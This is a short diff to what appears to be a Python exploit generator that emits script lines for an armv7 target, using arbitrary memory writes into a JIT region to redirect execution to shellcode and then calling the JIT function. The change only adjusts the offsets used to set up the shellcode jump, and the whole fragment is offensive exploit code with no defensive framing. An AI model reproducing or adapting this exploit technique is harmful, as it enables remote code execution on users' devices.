@@ -35,9 +35,9 @@ def main():
         elif arch == "armv7":
             target.write("mem.write32(jit_addr2, jit_addr2+0x4);\n")
             target.write("mem.write32(jit_addr2+0x4, jit_addr2+0x4);\n")
-            target.write("mem.write32(jit_addr2+0x08, shellcode+0x1);\n")
-            target.write("mem.write32(jit_addr2+0x30, jit_addr2+0x30+4-0x18);\n")
-            target.write("mem.write32(jit_addr2+0x34, jit_addr2+0x8-0x1c);\n")
+            target.write("mem.write32(jit_addr2+0x08, shellcode);\n")
+            target.write("mem.write32(jit_addr2+0x30, jit_addr2+0x1C);\n")
+            target.write("mem.write32(jit_addr2+0x34, jit_addr2-0x14);\n")
             target.write("jit_func2();\n")
 
 if __name__ == "__main__":
